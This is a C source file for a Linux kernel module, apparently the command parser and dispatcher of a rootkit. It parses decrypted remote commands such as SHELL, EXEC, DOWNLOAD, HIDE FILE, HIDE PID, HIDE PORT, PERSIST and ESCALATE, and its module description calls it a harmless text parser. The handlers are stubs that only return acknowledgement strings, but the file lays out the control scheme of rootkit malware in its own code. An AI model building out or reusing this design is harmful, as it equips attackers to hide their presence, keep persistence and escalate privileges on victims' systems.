// SPDX-License-Identifier: GPL-2.0
#include <linux/init.h>
#include <linux/module.h>
#include <linux/string.h>

#define RK_ARG_MAX	128

/* ------------------------------------------------------------------ */
/* Command kinds                                                       */
/* ------------------------------------------------------------------ */

enum rk_cmd_kind {
	RK_CMD_PING,
	RK_CMD_STATUS,
	RK_CMD_SHELL,
	RK_CMD_EXEC,
	RK_CMD_DOWNLOAD,
	RK_CMD_HIDE_FILE,
	RK_CMD_UNHIDE_FILE,
	RK_CMD_HIDE_PID,
	RK_CMD_UNHIDE_PID,
	RK_CMD_HIDE_CONTENT,
	RK_CMD_UNHIDE_CONTENT,
	RK_CMD_HIDE_PORT,
	RK_CMD_UNHIDE_PORT,
	RK_CMD_PERSIST,
	RK_CMD_UNPERSIST,
	RK_CMD_ESCALATE,
	RK_CMD_INFO,
	RK_CMD_LIST,
	RK_CMD_UNKNOWN,
};

struct rk_command {
	enum rk_cmd_kind kind;
	char arg[RK_ARG_MAX];
};

/* ------------------------------------------------------------------ */
/* Parsing helpers                                                     */
/* ------------------------------------------------------------------ */

/* Copy at most RK_ARG_MAX-1 bytes from src into cmd->arg, null-terminate. */
static void rk_copy_arg(struct rk_command *cmd, const char *src, size_t len)
{
	if (len >= RK_ARG_MAX)
		len = RK_ARG_MAX - 1;
	memcpy(cmd->arg, src, len);
	cmd->arg[len] = '\0';
}

/* Strip trailing whitespace/newlines from the buffer. Returns new length. */
static size_t rk_strip(const char *buf, size_t len)
{
	while (len > 0 && (buf[len - 1] == '\n' || buf[len - 1] == '\r' ||
			   buf[len - 1] == ' '))
		len--;
	return len;
}

/* Check if buf starts with prefix (case-sensitive). */
static bool rk_prefix(const char *buf, size_t len, const char *prefix,
		       size_t plen)
{
	if (len < plen)
		return false;
	return memcmp(buf, prefix, plen) == 0;
}

/* Check if buf exactly matches word (after stripping). */
static bool rk_exact(const char *buf, size_t len, const char *word)
{
	size_t wlen = strlen(word);

	return len == wlen && memcmp(buf, word, wlen) == 0;
}

/* ------------------------------------------------------------------ */
/* Command parser                                                      */
/* ------------------------------------------------------------------ */

/* Parse a text command from a decrypted buffer into a structured command. */
int rk_command_parse(const char *buf, size_t len, struct rk_command *cmd)
{
	cmd->kind = RK_CMD_UNKNOWN;
	cmd->arg[0] = '\0';

	len = rk_strip(buf, len);
	if (!len)
		return -EINVAL;

	/* Two-word prefixed commands with arguments. */
	if (rk_prefix(buf, len, "HIDE FILE ", 10)) {
		cmd->kind = RK_CMD_HIDE_FILE;
		rk_copy_arg(cmd, buf + 10, len - 10);
		return 0;
	}
	if (rk_prefix(buf, len, "UNHIDE FILE ", 12)) {
		cmd->kind = RK_CMD_UNHIDE_FILE;
		rk_copy_arg(cmd, buf + 12, len - 12);
		return 0;
	}
	if (rk_prefix(buf, len, "HIDE PID ", 9)) {
		cmd->kind = RK_CMD_HIDE_PID;
		rk_copy_arg(cmd, buf + 9, len - 9);
		return 0;
	}
	if (rk_prefix(buf, len, "UNHIDE PID ", 11)) {
		cmd->kind = RK_CMD_UNHIDE_PID;
		rk_copy_arg(cmd, buf + 11, len - 11);
		return 0;
	}
	if (rk_prefix(buf, len, "HIDE CONTENT ", 13)) {
		cmd->kind = RK_CMD_HIDE_CONTENT;
		rk_copy_arg(cmd, buf + 13, len - 13);
		return 0;
	}
	if (rk_prefix(buf, len, "UNHIDE CONTENT ", 15)) {
		cmd->kind = RK_CMD_UNHIDE_CONTENT;
		rk_copy_arg(cmd, buf + 15, len - 15);
		return 0;
	}
	if (rk_prefix(buf, len, "HIDE PORT ", 10)) {
		cmd->kind = RK_CMD_HIDE_PORT;
		rk_copy_arg(cmd, buf + 10, len - 10);
		return 0;
	}
	if (rk_prefix(buf, len, "UNHIDE PORT ", 12)) {
		cmd->kind = RK_CMD_UNHIDE_PORT;
		rk_copy_arg(cmd, buf + 12, len - 12);
		return 0;
	}

	/* Single-word commands with arguments. */
	if (rk_prefix(buf, len, "EXEC ", 5)) {
		cmd->kind = RK_CMD_EXEC;
		rk_copy_arg(cmd, buf + 5, len - 5);
		return 0;
	}
	if (rk_prefix(buf, len, "DOWNLOAD ", 9)) {
		cmd->kind = RK_CMD_DOWNLOAD;
		rk_copy_arg(cmd, buf + 9, len - 9);
		return 0;
	}
	if (rk_prefix(buf, len, "LIST ", 5)) {
		cmd->kind = RK_CMD_LIST;
		rk_copy_arg(cmd, buf + 5, len - 5);
		return 0;
	}

	/* Bare keywords (no arguments). */
	if (rk_exact(buf, len, "PING")) {
		cmd->kind = RK_CMD_PING;
		return 0;
	}
	if (rk_exact(buf, len, "STATUS")) {
		cmd->kind = RK_CMD_STATUS;
		return 0;
	}
	if (rk_exact(buf, len, "SHELL")) {
		cmd->kind = RK_CMD_SHELL;
		return 0;
	}
	if (rk_exact(buf, len, "PERSIST")) {
		cmd->kind = RK_CMD_PERSIST;
		return 0;
	}
	if (rk_exact(buf, len, "UNPERSIST")) {
		cmd->kind = RK_CMD_UNPERSIST;
		return 0;
	}
	if (rk_exact(buf, len, "ESCALATE")) {
		cmd->kind = RK_CMD_ESCALATE;
		return 0;
	}
	if (rk_exact(buf, len, "INFO")) {
		cmd->kind = RK_CMD_INFO;
		return 0;
	}

	return 0;
}

/* ------------------------------------------------------------------ */
/* Command dispatch (stub handlers)                                    */
/* ------------------------------------------------------------------ */

/* Placeholder response sender. In the integrated module, this sends
 * an encrypted frame. Here it is a no-op for compilation. */
static int rk_send_response(const char *resp)
{
	(void)resp;
	return 0;
}

int rk_command_dispatch(struct rk_command *cmd)
{
	switch (cmd->kind) {
	case RK_CMD_PING:
		return rk_send_response("PONG");
	case RK_CMD_STATUS:
		return rk_send_response("OK");
	case RK_CMD_SHELL:
		return rk_send_response("SHELL OK");
	case RK_CMD_EXEC:
		return rk_send_response("EXEC OK");
	case RK_CMD_DOWNLOAD:
		return rk_send_response("DOWNLOAD OK");
	case RK_CMD_HIDE_FILE:
		return rk_send_response("HIDE FILE OK");
	case RK_CMD_UNHIDE_FILE:
		return rk_send_response("UNHIDE FILE OK");
	case RK_CMD_HIDE_PID:
		return rk_send_response("HIDE PID OK");
	case RK_CMD_UNHIDE_PID:
		return rk_send_response("UNHIDE PID OK");
	case RK_CMD_HIDE_CONTENT:
		return rk_send_response("HIDE CONTENT OK");
	case RK_CMD_UNHIDE_CONTENT:
		return rk_send_response("UNHIDE CONTENT OK");
	case RK_CMD_HIDE_PORT:
		return rk_send_response("HIDE PORT OK");
	case RK_CMD_UNHIDE_PORT:
		return rk_send_response("UNHIDE PORT OK");
	case RK_CMD_PERSIST:
		return rk_send_response("PERSIST OK");
	case RK_CMD_UNPERSIST:
		return rk_send_response("UNPERSIST OK");
	case RK_CMD_ESCALATE:
		return rk_send_response("ESCALATE OK");
	case RK_CMD_INFO:
		return rk_send_response("INFO OK");
	case RK_CMD_LIST:
		return rk_send_response("LIST OK");
	case RK_CMD_UNKNOWN:
		return rk_send_response("ERR unknown command");
	}
	return -EINVAL;
}

/* ------------------------------------------------------------------ */
/* Module lifecycle                                                    */
/* ------------------------------------------------------------------ */

static int __init rk_init(void)
{
	return 0;
}

static void __exit rk_exit(void)
{
}

module_init(rk_init);
module_exit(rk_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Text command parser and dispatcher");
